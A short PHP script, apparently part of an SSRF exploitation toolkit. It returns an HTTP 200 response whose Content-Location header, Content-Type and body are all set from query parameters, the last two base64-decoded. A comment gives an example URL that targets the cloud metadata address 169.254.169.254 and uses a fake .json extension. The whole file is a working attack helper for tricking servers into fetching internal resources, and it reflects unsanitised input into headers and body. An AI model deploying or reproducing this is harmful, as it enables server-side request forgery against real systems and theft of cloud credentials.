<?php
#200 response with valid json body and with Content-Location
#https://ssrf.localdomain.pw/custom-200/?url=http://169.254.169.254/&content-type=YXBwbGljYXRpb24vanNvbg==&body=eyJhIjpbeyJiIjoiMiIsImMiOiIzIn1dfQ==&fakext=/j.json
header("HTTP/1.1 200 OK");
header("Content-Location: ".$_GET["url"]);
header("Content-Type:".base64_decode($_GET["content-type"]));
header("Cache-Control: max-age=0, must-revalidate, no-cache, no-store, private");
header("Pragma: no-cache");
echo base64_decode($_GET["body"]);
